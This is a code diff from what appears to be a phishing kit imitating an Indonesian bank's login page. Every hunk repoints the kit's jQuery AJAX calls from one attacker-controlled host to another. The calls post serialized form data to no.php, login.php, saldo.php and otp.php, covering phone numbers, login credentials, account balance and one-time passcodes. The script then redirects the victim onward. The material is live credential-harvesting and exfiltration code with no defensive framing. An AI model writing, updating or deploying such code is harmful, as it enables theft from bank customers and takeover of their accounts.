@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://zheuz.cloud/bsi/s6v2/no.php',
+            url: 'https://anjayhostjon.cloud/bsi/pk2u/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://zheuz.cloud/bsi/s6v2/login.php',
+            url: 'https://anjayhostjon.cloud/bsi/pk2u/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://zheuz.cloud/bsi/s6v2/saldo.php',
+            url: 'https://anjayhostjon.cloud/bsi/pk2u/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://zheuz.cloud/bsi/s6v2/otp.php',
+ url: 'https://anjayhostjon.cloud/bsi/pk2u/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -123,7 +123,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://zheuz.cloud/wa/s6v2';
+location.href='https://anjayhostjon.cloud/wa/pk2u';
     }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
